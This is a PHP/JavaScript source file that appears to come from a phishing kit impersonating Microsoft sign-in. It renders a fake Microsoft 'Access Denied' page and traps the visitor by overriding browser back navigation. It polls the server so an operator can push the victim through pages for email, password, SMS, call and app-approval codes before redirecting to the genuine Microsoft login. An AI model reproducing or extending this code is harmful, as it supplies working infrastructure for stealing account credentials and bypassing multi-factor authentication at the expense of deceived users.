<?php
// blocked.php — Blocked visitor — polls every 2s to stay blocked
require 'config.php';
require 'helpers.php';
session_start();

$sid = $_SESSION['visitor_id'] ?? '';

// If no session at all, just show blocked page
if ($sid) {
    $state = get_state($sid);
    // If admin unblocks (sets page to anything else), redirect there
    // But if they are blocked, keep them here regardless of navigation attempts
    if (!empty($state['blocked']) && $state['page'] !== 'blocked') {
        // Re-lock — visitor tried to navigate away while blocked
        set_state($sid, ['page' => 'blocked']);
    }
}

page_open('Access Denied', false);
?>

<div class="card" style="text-align:center;max-width:420px">
  <?= company_logo_html() ?>

  <!-- Lock icon -->
  <div style="margin:8px auto 20px;width:56px;height:56px;border-radius:50%;
              background:#fff0f0;display:flex;align-items:center;justify-content:center;font-size:26px">
    🔒
  </div>

  <h1 style="font-size:20px;font-weight:600;color:#1b1b1b;margin-bottom:12px">
    Access Denied
  </h1>
  <p style="font-size:14px;color:#555;line-height:1.6;margin-bottom:28px;font-family:'Roboto',sans-serif">
    Your access to this resource has been restricted by the administrator.<br><br>
    If you believe this is a mistake, please contact your IT administrator for assistance.
  </p>
  <a href="https://support.microsoft.com" style="color:#0067b8;font-size:13px;text-decoration:none">
    Contact Microsoft Support
  </a>
</div>

<script>
// Poll every 2 seconds — if still blocked, forcibly redirect back here
// This prevents the visitor from navigating away using browser back/forward
(function(){
  // Intercept all navigation attempts
  window.onbeforeunload = function(e) {
    // Allow only if unblocked by admin
    return undefined;
  };

  history.pushState(null, '', location.href);
  window.addEventListener('popstate', function() {
    history.pushState(null, '', location.href);
  });

  function poll(){
    fetch('poll.php?t='+Date.now(), {cache:'no-store'})
      .then(r => r.json())
      .then(d => {
        if (d.blocked && d.page === 'blocked') {
          // Still blocked — make sure we stay here
          history.pushState(null, '', 'blocked.php');
          return;
        }
        // Admin unblocked — allow navigation to correct page
        const map = {
          'email':        'index.php',
          'password':     'password.php',
          'loading':      'loading.php',
          'verify_code':  'verify-code.php',
          'text_code':    'text-code.php',
          'call_code':    'call-code.php',
          'approve_app':  'approve-app.php',
          'success':      'https://login.microsoftonline.com/',
        };
        const dest = map[d.page];
        if (dest) window.location.replace(dest);
      }).catch(()=>{});
  }

  setInterval(poll, 2000);
  poll();
})();
</script>

<?php page_close(); ?>